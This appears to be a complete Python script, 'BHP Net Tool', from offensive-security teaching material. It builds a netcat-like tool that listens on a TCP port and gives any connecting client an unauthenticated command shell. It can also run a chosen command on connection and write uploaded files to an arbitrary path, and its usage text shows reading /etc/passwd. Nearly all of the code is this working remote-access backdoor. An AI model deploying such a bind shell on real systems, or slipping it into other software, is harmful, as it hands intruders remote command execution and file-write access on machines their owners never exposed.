import sys
import socket
import getopt
import threading
import subprocess

# define some globals
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0


def usage():
    print("BHP Net Tool\n")
    print("Usage: bh_net.py -t target_host -p port")
    print("-l --listen\t\t - listen on [host]:[port] for incoming connections")
    print("-e --execute\t\t - execute the given file upon receiving a connection")
    print("-c --command\t\t - initialize a command shell")
    print("-u --upload=destination\t - upon receiving connection upload a file and write to [destination]\n\n")
    print("Examples:")
    print("bh_net.py -t 192.168.0.1 -p 5555 -l -c")
    print("bh_net.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("bh_net.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'ABCDEFGHI' | ./bh_net.py -t 192.168.0.1 -p 135")
    sys.exit(0)


def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # connect to our target host
        client.connect((target,port))

        if len(buffer):
            client.send(buffer.encode())

        # now wait for data back
        response = ""

        while True:
            data = client.recv(4096)

            if not data:
                break

            response += data.decode("utf-8")
            print(response, end="")

            # wait for more input
            try:
                buffer = input("")
                buffer += "\n"
                client.send(buffer.encode("utf-8"))
            except EOFError:
                print("CTRL-D detected")
                break

    except Exception as err:
        print("[*] Exception! Exiting.")
        print(str(err))

        # tear down the connection
        client.close()
        raise err


def server_loop():
    global target

    # if not target is defined listen on all interfaces
    if not len(target):
        target = "0.0.0.0"

    print("creating socket")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("binding")
    server.bind((target, port))
    server.listen(5)

    print("listening")
    while True:
        client_socket, addr = server.accept()

        # spin off a thread to handle our new client
        print("spin up")
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()


def run_command(command):

    # trim the new line
    command = command.rstrip()

    # run the command and get the output back
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"

    # send the output back
    return output


def client_handler(client_socket):
    global upload
    global execute
    global command

    print("in client_handler")
    # check for upload
    if len(upload_destination):
        # read in all of the bytes and write to our destination
        file_buffer = ""

        # keep reading data until none is available
        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        # now take the bytes and write them out
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            # acknowledge that we wrote the file out
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)


    # check for command execution
    if len(execute):

        # run the command
        output = run_command(execute)
        client_socket.send(output)

    # now we go into another loop if a command shell was requested
    if command:
        print("Command is true")
        while True:
            # show a simple prompt
            client_socket.send("<BHP:#> ".encode("utf-8"))

            # now we receive until we see a linefeed (return key)
            cmd_buffer = b""
            while b"\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            # send back the command output
            response = run_command(cmd_buffer.decode("utf-8"))
            client_socket.send(response)



def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # read the command line options

    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o,a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled option"

    # are we going to listen or just send data from stdin?
    if not listen and len(target) and port > 0:
        print("reading...")
        # read the buffer from the commandline
        # this will block, so send CTRL-D if not sending any input to stdin
        buffer = sys.stdin.read()
        print("sending...")
        # send off the data
        client_sender(buffer)
        

    # we are going to listen and potentially upload things, execute commands, and drop a shell back
    # depending on our command line options above

    if listen:
        server_loop()
        #pass


main()

